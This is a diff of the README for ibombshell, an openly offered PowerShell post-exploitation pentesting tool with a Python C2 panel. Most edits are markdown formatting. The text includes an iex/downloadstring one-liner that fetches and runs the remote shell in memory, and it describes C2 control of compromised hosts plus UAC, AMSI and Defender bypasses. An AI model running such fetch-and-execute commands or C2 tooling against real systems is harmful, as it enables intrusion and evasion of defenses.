@@ -4,25 +4,25 @@
 # **ibombshell - Dynamic Remote Shell**
 
 ```
-      ,--.!,    _ ____                  __   _____ __         ____  
-   __/   -*-   (_) __ )____  ____ ___  / /_ / ___// /_  ___  / / /  
- ,d08b.  '|`  / / __  / __ \/ __ `__ \/ __ \\__ \/ __ \/ _ \/ / /  
- 0088MM      / / /_/ / /_/ / / / / / / /_/ /__/ / / / /  __/ / /  
- `9MMP'     /_/_____/\____/_/ /_/ /_/_.___/____/_/ /_/\___/_/_/  
+      ,--.!,    _ ____                  __   _____ __         ____
+   __/   -*-   (_) __ )____  ____ ___  / /_ / ___// /_  ___  / / /
+ ,d08b.  '|`  / / __  / __ \/ __ `__ \/ __ \\__ \/ __ \/ _ \/ / /
+ 0088MM      / / /_/ / /_/ / / / / / / /_/ /__/ / / / /  __/ / /
+ `9MMP'     /_/_____/\____/_/ /_/ /_/_.___/____/_/ /_/\___/_/_/
 
  [+] Starting the console...
  [*] Console ready!
 ```
 
-**ibombshell** is a tool written in Powershell that allows you to have a prompt at any time with post-exploitation functionalities (and in some cases exploitation). It is a shell that is downloaded directly to memory providing access to a large number of pentesting features. These functionalities can be downloaded directly to memory, in the form of a Powershell function. This form of execution is known as *everywhere*.
+**ibombshell** is a tool written in Powershell that allows you to have a prompt at any time with post-exploitation functionalities (and in some cases exploitation). It is a shell that is downloaded directly to memory providing access to a large number of pentesting features. These functionalities can be downloaded directly to memory, in the form of a Powershell function. This form of execution is known as _everywhere_.
 
-In addition, *ibombshell* provides a second execution mode called *Silently*, so the pentester can execute an instance of ibombshell (called *warrior*). The compromised computer will be connected to a C2 panel through HTTP. Therefore, it will be possible to control the warrior and be able to load functions in memory that help the pentester. This is happening whithin the post-exploitation phase.
+In addition, _ibombshell_ provides a second execution mode called _Silently_, so the pentester can execute an instance of ibombshell (called _warrior_). The compromised computer will be connected to a C2 panel through HTTP. Therefore, it will be possible to control the warrior and be able to load functions in memory that help the pentester. This is happening whithin the post-exploitation phase.
 
 # Prerequisities
 
-To run *ibombshell everywhere* it is mandatory to have PowerShell 3.0 or higher. For operating systems other than Windows you can read more about this in the [PowerShell GitHub](https://github.com/PowerShell/PowerShell) - *PowerShell for every system!*.
+To run _ibombshell everywhere_ it is mandatory to have PowerShell 3.0 or higher. For operating systems other than Windows you can read more about this in the [PowerShell GitHub](https://github.com/PowerShell/PowerShell) - _PowerShell for every system!_.
 
-To run the *ibombshell silently mode* you need python 3.6 and some python libraries. You can install this with:
+To run the _ibombshell silently mode_ you need python 3.6 and some python libraries. You can install this with:
 
 ```[python]
 cd ibombshell\ c2/
@@ -40,7 +40,7 @@ ibombshell has two execution modes:
 To load ibombshell simply run on PowerShell:
 
 ```[powershell]
-iex (new-object net.webclient).downloadstring(‘https://raw.githubusercontent.com/ElevenPaths/ibombshell/master/console’)
+iex (new-object net.webclient).downloadstring(‘https://raw.githubusercontent.com/Telefonica/ibombshell/master/console’)
 ```
 
 Now you can run the downloaded ibombshell console running:
@@ -70,7 +70,7 @@ AHUAdAAtAHMAdAByAGkAbgBnACAAfAAgAGkAZQB4ADsAIABjADoAOwAgAGMAbwBuAHMAbwBsAGUAOwB9
 This version allows you to run the ibombshell console and remotely control it from the C2 panel created in python. To run this version, first you must launch the console process in powershell:
 
 ```[powershell]
-iex (new-object net.webclient).downloadstring(‘https://raw.githubusercontent.com/ElevenPaths/ibombshell/master/console’)
+iex (new-object net.webclient).downloadstring(‘https://raw.githubusercontent.com/Telefonica/ibombshell/master/console’)
 ```
 
 On ibombshell C2 path, prepare the C2:
@@ -130,37 +130,37 @@ sudo docker run -it ibombshell
 
 Some example videos...
 
-### *iBombShell: PoC Warrior + Bypass UAC + Pass the hash*
+### _iBombShell: PoC Warrior + Bypass UAC + Pass the hash_
 
 [![iBombShell: PoC Warrior + Bypass UAC + Pass the hash](https://img.youtube.com/vi/v4c8MsOPTyA/0.jpg)](http://www.youtube.com/watch?v=v4c8MsOPTyA)
 
-### *iBombShell: macOS*
+### _iBombShell: macOS_
 
 [![iBombShell: PoC de uso desde macOS](https://img.youtube.com/vi/DQlWGPS1CB4/0.jpg)](http://www.youtube.com/watch?v=DQlWGPS1CB4)
 
-### *ibombshell: Extracting Private SSH Keys on Windows 10*
+### _ibombshell: Extracting Private SSH Keys on Windows 10_
 
 [![ibombshell: Módulo para extracción de claves privadas SSH en Windows 10](https://img.youtube.com/vi/v7iXEg9cTNY/0.jpg)](http://www.youtube.com/watch?v=v7iXEg9cTNY)
 
-### *iBombShell: PoC savefunctions*
+### _iBombShell: PoC savefunctions_
 
 [![iBombShell: PoC savefunctions](https://img.youtube.com/vi/QM0HufCYOEk/0.jpg)](https://www.youtube.com/watch?v=QM0HufCYOEk)
 
-### *ibombshell - Silently bypass UAC Environment Injection*
+### _ibombshell - Silently bypass UAC Environment Injection_
 
 [![ibombshell - Modo silencioso para el bypass UAC Environment Injection](https://img.youtube.com/vi/XrWM2gcXo3w/0.jpg)](https://www.youtube.com/watch?v=XrWM2gcXo3w)
 
-### *iBombShell - Mocking Trusted Directory*
+### _iBombShell - Mocking Trusted Directory_
 
 [![iBombShell - Mocking Trusted Directory](https://img.youtube.com/vi/6iCFS4FkedM/0.jpg)](https://www.youtube.com/watch?v=6iCFS4FkedM)
 
-### *iBombShell - DLL generation*
+### _iBombShell - DLL generation_
+
 [![iBombShell - DLL Generation](https://img.youtube.com/vi/I03klvk-DXo/0.jpg)](https://www.youtube.com/watch?v=I03klvk-DXo)
 
+### _iBombShell - AMSI & Windows Defender Bypass_
 
-### *iBombShell - AMSI & Windows Defender Bypass*
 [![iBombShell - AMSI & Windows Defender Bypass](https://img.youtube.com/vi/wCBLG3CfWMY/0.jpg)](https://www.youtube.com/watch?v=wCBLG3CfWMY)
-
 
 # License
 
@@ -174,10 +174,10 @@ This software doesn't have a QA Process. This software is a Proof of Concept.
 
 If you have any problems, you can contact:
 
-<pablo@11paths.com> - *Ideas Locas CDO - Telefónica*
+<pablo@11paths.com> - _Ideas Locas CDO - Telefónica_
 
-<alvaro.nunezromero@11paths.com> - *Laboratorio Innovación - ElevenPaths*
+<alvaro.nunezromero@11paths.com> - _Laboratorio Innovación - ElevenPaths_
 
-<josue.encinargarcia@telefonica.com> - *Ideas Locas CDO - Telefónica*
+<josue.encinargarcia@telefonica.com> - _Ideas Locas CDO - Telefónica_
 
 For more information please visit [https://www.elevenpaths.com](https://www.elevenpaths.com).
